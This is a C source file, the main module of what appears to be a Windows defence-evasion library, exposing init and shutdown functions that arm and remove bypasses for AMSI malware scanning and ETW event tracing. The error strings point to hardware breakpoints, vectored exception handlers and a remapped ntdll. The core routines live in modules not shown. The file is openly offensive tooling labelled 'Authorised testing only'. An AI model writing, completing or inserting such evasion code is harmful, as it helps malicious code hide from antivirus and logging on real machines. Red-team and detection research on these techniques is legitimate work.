/* bypass_main.c — public API: bp_init / bp_shutdown
 * Authorised testing only.
 */
#include "../include/bypass.h"

/* Forward declarations from sibling modules. */
bp_result_t bp_amsi_hwbp_install(void);  void bp_amsi_hwbp_uninstall(void);
bp_result_t bp_etw_hwbp_install(void);   void bp_etw_hwbp_uninstall(void);
void        bp_veh_shutdown(void);

static uint32_t g_active = 0;

bp_result_t bp_init(uint32_t mask)
{
    bp_result_t r;
    if (mask & BP_AMSI_HWBP) {
        r = bp_amsi_hwbp_install();
        if (r != BP_OK) return r;
        g_active |= BP_AMSI_HWBP;
    }
    if (mask & BP_ETW_PATCH) {
        r = bp_etw_hwbp_install();
        if (r != BP_OK) return r;
        g_active |= BP_ETW_PATCH;
    }
    return BP_OK;
}

void bp_shutdown(void)
{
    if (g_active & BP_AMSI_HWBP) bp_amsi_hwbp_uninstall();
    if (g_active & BP_ETW_PATCH) bp_etw_hwbp_uninstall();
    bp_veh_shutdown();
    g_active = 0;
}

const char *bp_strerror(bp_result_t r)
{
    switch (r) {
        case BP_OK:                    return "OK";
        case BP_ERR_AMSI_NOT_LOADED:   return "amsi.dll not loaded / AmsiScanBuffer not found";
        case BP_ERR_VEH_REGISTER:      return "AddVectoredExceptionHandler failed";
        case BP_ERR_SET_CONTEXT:       return "SetThreadContext failed (Dr arm)";
        case BP_ERR_NTDLL_OPEN:        return "NtOpenSection(\\KnownDlls\\ntdll.dll) failed";
        case BP_ERR_NTDLL_MAP:         return "NtMapViewOfSection failed";
        case BP_ERR_NTDLL_PROTECT:     return "VirtualProtect failed";
        case BP_ERR_ETW_NOT_FOUND:     return "EtwEventWrite not resolved in ntdll";
        case BP_ERR_ETW_PROTECT:       return "ETW protect failed";
        default:                       return "unknown";
    }
}
